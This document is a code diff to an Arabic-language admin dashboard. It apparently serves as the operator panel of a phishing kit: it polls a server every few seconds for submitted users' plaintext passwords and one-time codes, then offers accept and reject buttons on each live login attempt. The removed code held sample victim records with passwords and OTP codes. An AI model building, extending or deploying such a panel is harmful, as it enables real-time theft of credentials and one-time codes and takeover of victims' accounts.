@@ -109,7 +109,8 @@
   }
   .admin-content {
     padding: 24px;
-    max-width: 900px;
+    width: 100%;
+    max-width: 1400px;
     margin: 0 auto;
   }
   .cards-row {
@@ -139,6 +140,7 @@
     border-radius: 10px;
     padding: 20px;
     box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    overflow-x: auto;
   }
   .panel h3 {
     margin-top: 0;
@@ -349,7 +351,7 @@
           <path d="M2.5 8.5C8 3.5 16 3.5 21.5 8.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
         </svg>
         <div>
-          <div class="live-count" id="liveCount">47</div>
+          <div class="live-count" id="liveCount">0</div>
           <div class="live-label">زيارات نشطة الآن</div>
         </div>
       </div>
@@ -357,15 +359,15 @@
       <div class="cards-row">
         <div class="stat-card">
           <div class="label">إجمالي المستخدمين</div>
-          <div class="value">1,284</div>
+          <div class="value">0</div>
         </div>
         <div class="stat-card">
-          <div class="label">نشط اليوم</div>
-          <div class="value">312</div>
+          <div class="label">إجمالي الزيارات</div>
+          <div class="value" id="totalVisits">0</div>
         </div>
         <div class="stat-card">
-          <div class="label">محاولات تسجيل الدخول</div>
-          <div class="value">4,590</div>
+          <div class="label">إجمالي المستخدمين</div>
+          <div class="value" id="userCount">0</div>
         </div>
       </div>
 
@@ -420,41 +422,9 @@
       document.getElementById('adminPassword').value = '';
     }
 
-    // ---- Requests data ----
-    const mockRequests = [
-      { name: "أحمد محمد", phone: "0501234567", email: "ahmed.m@example.com", status: "جديد", statusClass: "status-new", date: "2026-09-08", notes: "طلب فتح حساب جديد", username: "ahmed.m", password: "Ahmed@2026", code: "384920" },
-      { name: "سارة خالد", phone: "0559876543", email: "sara.k@example.com", status: "قيد المعالجة", statusClass: "status-progress", date: "2026-09-07", notes: "استفسار عن كلمة المرور", username: "sara.k", password: "Sara#1234", code: "921047" },
-      { name: "محمد ناصر", phone: "0533456789", email: "m.nasser@example.com", status: "مكتمل", statusClass: "status-done", date: "2026-09-05", notes: "تم حل المشكلة", username: "m.nasser", password: "Nasser99!", code: "560312" },
-      { name: "ريم عبدالله", phone: "0567891234", email: "reem.a@example.com", status: "جديد", statusClass: "status-new", date: "2026-09-09", notes: "طلب دعم فني", username: "reem.abdullah", password: "Reem_2026", code: "738415" }
-    ];
-
-    const statusLabels = { pending: 'قيد الانتظار', accepted: 'مقبول', rejected: 'مرفوض' };
-    const statusClasses = { pending: 'status-pending', accepted: 'status-accepted', rejected: 'status-rejected' };
-
-    // Combine the demo requests with real login/verification requests submitted from the site
-    function getAllRequests() {
-      const live = JSON.parse(localStorage.getItem('verifyRequests') || '[]').map(r => ({
-        id: r.id,
-        isLive: true,
-        name: r.username || '—',
-        phone: '—',
-        email: '—',
-        status: statusLabels[r.status],
-        statusClass: statusClasses[r.status],
-        date: r.timestamp,
-        notes: 'طلب تسجيل دخول حقيقي من الموقع',
-        username: r.username || '—',
-        password: r.password || '—',
-        code: r.code,
-        rawStatus: r.status
-      }));
-      return [...live.slice().reverse(), ...mockRequests];
-    }
-
     let currentRequests = [];
 
     function renderRequests() {
-      currentRequests = getAllRequests();
       const tbody = document.getElementById('requestsTable');
       tbody.innerHTML = currentRequests.map((r, i) => `
         <tr>
@@ -475,7 +445,7 @@
     function showDetails(index) {
       const r = currentRequests[index];
       const modalBody = document.getElementById('modalBody');
-      const showActions = r.isLive && r.rawStatus === 'pending';
+      const showActions = r.statusKey === 'pending';
       modalBody.innerHTML = `
         <div class="modal-row"><span class="field-label">الاسم</span><span class="field-value">${r.name}</span></div>
         <div class="modal-row"><span class="field-label">رقم الهاتف</span><span class="field-value">${r.phone}</span></div>
@@ -488,21 +458,22 @@
         <div class="modal-row"><span class="field-label">ملاحظات</span><span class="field-value">${r.notes}</span></div>
         ${showActions ? `
           <div class="action-btns" style="margin-top:16px; justify-content:center;">
-            <button class="action-btn accept-btn" onclick="decideRequest('${r.id}','accepted')">قبول</button>
-            <button class="action-btn reject-btn" onclick="decideRequest('${r.id}','rejected')">رفض</button>
+            <button class="action-btn accept-btn" onclick="decideRequest('accepted')">قبول</button>
+            <button class="action-btn reject-btn" onclick="decideRequest('rejected')">رفض</button>
           </div>
         ` : ''}
       `;
       document.getElementById('modalOverlay').classList.add('active');
     }
 
-    function decideRequest(id, decision) {
-      const requests = JSON.parse(localStorage.getItem('verifyRequests') || '[]');
-      const req = requests.find(r => r.id === id);
-      if (req) req.status = decision;
-      localStorage.setItem('verifyRequests', JSON.stringify(requests));
+    async function decideRequest(decision) {
+      await fetch('/api/decision', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status: decision })
+      });
       closeModal();
-      renderRequests();
+      loadDashboard();
     }
 
     function closeModal() {
@@ -517,19 +488,30 @@
       if (e.target === this) closeModal();
     });
 
-    renderRequests();
-    setInterval(renderRequests, 2000);
-
-    // ---- Live visitor count simulation ----
-    function updateLiveCount() {
-      const el = document.getElementById('liveCount');
-      const current = parseInt(el.textContent);
-      const change = Math.floor(Math.random() * 5) - 2;
-      let next = current + change;
-      if (next < 1) next = 1;
-      el.textContent = next;
+    async function loadDashboard() {
+      try {
+        const response = await fetch('/api/users', { cache: 'no-store' });
+        if (!response.ok) throw new Error('تعذر تحميل بيانات اللوحة');
+        const data = await response.json();
+        document.getElementById('liveCount').textContent = data.activeVisits || 0;
+        document.getElementById('totalVisits').textContent = data.totalVisits || 0;
+        document.getElementById('userCount').textContent = data.users.length;
+        currentRequests = data.users.map(user => ({
+          ...user,
+          statusClass: user.statusKey === 'accepted' ? 'status-accepted' : user.statusKey === 'rejected' ? 'status-rejected' : 'status-pending',
+          date: 'بيانات حالية من الموقع',
+          notes: 'طلب جديد من الموقع',
+          code: user.otpCode || '—'
+        }));
+        renderRequests();
+      } catch (error) {
+        document.getElementById('requestsTable').innerHTML = '<tr><td colspan="5">تعذر تحميل البيانات من السيرفر</td></tr>';
+      }
     }
-    setInterval(updateLiveCount, 4000);
+
+    loadDashboard();
+    setInterval(loadDashboard, 3000);
+
   </script>
 
 </body>
